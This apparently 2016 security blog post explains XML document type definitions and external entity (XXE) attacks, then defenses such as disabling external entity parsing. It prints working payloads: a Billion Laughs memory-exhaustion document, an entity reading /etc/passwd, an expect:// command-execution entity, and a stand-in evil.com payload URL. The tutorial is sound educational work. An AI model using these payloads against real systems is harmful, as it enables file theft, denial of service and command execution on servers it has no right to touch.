+++
comments = true
date = "2016-02-06T16:00:00-06:00"
draft = false
slug = "xxe-ugly-side-of-xml"
image = "/content/images/xxe_cover.png"
tags = ["NolaSec", "Penetration Testing", "XML", "XXE"]
title = "XXE - The Ugly Side of XML"

+++

The eXtensible Markup Language (XML) has a very long and lustrious reputation
for being he go-to language for storing and transferring self describing data.
Unfortunately though, XML's root have presented a problem that can plauge many
improperly configured parsers. This problem is eXternal XML Entity attacks
(XXE).

## Extensible Markup Language (XML)

[Extensible Markup Language (XML)](https://en.wikipedia.org/wiki/XML) is
designed to be a markup language that expresses data in a format that is both
human and machine readable. It is defined by the
[W3C's XML 1.0 Specification](https://www.w3.org/TR/REC-xml/). XML is actually
a subset of the [Standard Generalized Markup Language
(SGML)](https://en.wikipedia.org/wiki/Standard_Generalized_Markup_Language) and
it is from this specification that XML inherited the [Document Type Definition
(DTD)](https://en.wikipedia.org/wiki/Document_type_definition). DTD is a
language that allows for the definition of the schema used within an XML
document. This is an example of an XML document used to define the layout of
web page (XHTML) that includes the DTD header that is used to define the
acceptable tags in the page:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE html PUBLIC
	"-//W3C//DTD XHTML 1.0 Transitional//EN"
	"DTD/xhtml1-transitional.dtd">
<html
	xmlns="http://www.w3.org/1999/xhtml"
	xml:lang="en" lang="en">
	<head>
		<title>Page Title</title>
	</head>

	<body bgcolor="#FFFFFF"
		    link="#000000"
		    text="red">
		<p>Page Content</p>
	</body>
</html>
```

## Document Type Definition (DTD)

The Document Type Definition (DTD) defines the building blocks of the XML
document. It does this by laying out the acceptable elements and attributes
allowed in the document. This definition can be made either inline (in the
document), or held in an external document.

DTD contains another definition type called ENTITY. The entity definition works
like a variable or a macro, in that it will allow for the definition of large
or unwieldy data that can be stored in a single variable that can be used in
several places within the document. There are two ways to use this definition.

	<!ENTITY author "Joshua Barone" >

This would allow for the substitution to be used in the document.

	<name>&author;</name>

Which would be rendered as:

	<name>Joshua Barone</name>

There is also the ability to make a parameter definition. These simply add the
`%` character to denote the type:

	<!ENTITY % author "Joshua Barone" >
	<!ENTITY % awesome "&author; is awesome!" >

This would be used as before:

	<message>&awesome;<message>

Which would be rendered as:

	<message>Joshua Barone is awesome!</message>

The magic that happened here with the parameter definition is that it's Content
could be used in the definition of another entity. This will become important
later.

## The Attack

All of this was lead up to the actual attack. The  XML eXternal Entity (XXE)
attacks work my leveraging the fact that DTD entities can be defined in an
external source. These external definitions are defined by using the SYSTEM
attribute to denote that the document is to be parsed and included. These
definitions have the following syntax:

	<!ENTITY name SYSTEM "uri" >

Where name specifies the name of the entity that will hold the contents of the
parsed document, and uri refers to the URI where the document can be found.
Because it is a URI that is used, is where the danger really lies. The URI can
be used to reference all of the following:

<dl>
<dt>Payload Document</dt>
<dd>A document where a more complex XXE attack can be staged
`http://evil.com/payload.dtd`</dd>
<dt>Local File</dt>
<dd>Reference any document stored on the local machine that the current user
context has access to. `file:///etc/passwd`</dd>
<dt>Filters</dt>
<dd>Languages like php, java, and others provide specific syntax for defining
filters in the URI `php://filter/convert.base64-encode/resource=index.php`
</dl>

And there are others. The only limitation is in the imagination to abuse the URI.

### Billion Laughs Attack

The Billion Laughs Attack is a simple denial of service (DOS) style of attack
using XXEs. It works by using the expansion properties of the DTD language.

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ELEMENT lolz (#PCDATA)>
 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
 <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
 <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
 <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
 <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
 <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

This incredibly small amount of code (< 1KB) will expand to take up
approximately 3 gigabytes of memory. This happens due to the exponential growth
that is happening due to how the entities are defined. The single `lol9` will
be replaced with 10 `lol8` entities. Which are each replaced by 10 `lol7`
entities. And so on it goes.

### File Exfiltration

This attacks uses the external nature of the ENTITY to include a file on the
local system. Remember this is local to the system that is parsing the XML.

```xml
<?xml version="1.0"?>
<!DOCTYPE hacks [
 <!ENTITY passwd SYSTEM "file:///etc/passwd" >
]>
<hacks>&passwd;</hacks>
```

When this file is parsed, the hacks tags would contain the content of the
servers passwd file.

### Remote Code Execution

If the server that has this vulnerability is php and has the expect plugin
installed, it may be open to even more insidious attacks. The expect pluginis
designed to allow for a php application to run command line commands and
interact with them. The plugin also allows for using the `expect://` filter in
a URI. Which means that it can be used in the XXE attack.

```xml
<?xml version="1.0"?>
<!DOCTYPE hacks [
 <!ENTITY cmd SYSTEM "expect://id" >
]>
<hacks>&cmd;</hacks>
```

This would execute the `id` command on the system and would place the results
inside the hacks tags. This would allow an attacker to know exactly what context
and prvilidges would be available for further commands or file requests.

### And Many More...

There are many other things that could be done by leveraging XXE attacks. These
could include [Out-Of-Band attacks](https://goo.gl/9em1lH), that would still
allow for exfiltration even when the contents of the XML aren't being reflected
back to the attacker. Or file uploads, which leverages attacks against Java
parsers that will download jar files with these attacks.

## Defending

To defend against this type of attack, it first needs to be understood what is
vulnerable. The vulnerabilities lie in the parsing of the XML. Here are a few
examples of where XML is being used and parsed:

- File Uploadss
	- Document Formats (OOXML, PDF, ODF, GXML, etc…)
	- Configuration Files
	- Image Formats (SVG, EXIF headers, etc…)
- Network Protocols
	- SOAP
	- XMLRPC
	- REST
	- XMPP
	- SAML

This is an incomplete list as there are more scenarios that need to be
considered. That being considered, XXE defense comes down to one axiom.

> Know thy parser

Once XXE attacks became known about, three different approaches were taken
to solve the problem.

1. Don't reflect the XML back to the user:

	This approach is a more naive approach to fix the problem. It assumes That
	like the examples of above, the attack requires the inclusion of the attacking
	entity into a tag, whose contents are reflected back to the attacker. But this
	is certainly not the case. An attacker could make use of error messages,
	differences in timing, and even Out-Of-Band attack vectors to achieve the
	same ends.

2. Allow developers to disable external entity parsing:

	This solution is a great step in the correct direction. However, it is still
	lacking. If the developers are not aware that this is something they even
	need to be concerned about, then how would they know to go looking for the
	feature that allows them to disable this.

3. External entity parsing disabled by default:

	This is the solution. There are a few notes here though.

	- Don't turn it on
	- Make sure the stay up to date / patched
	- Use XSD instead of DTD for schema declarations.

If you are using a parser that relies on method #1, it would be best to change
parsers. If you are using a parser that relies on method #2 then all the
developers need to be aware of the dangers of XXE attacks and insure that
external parsing is turned off.
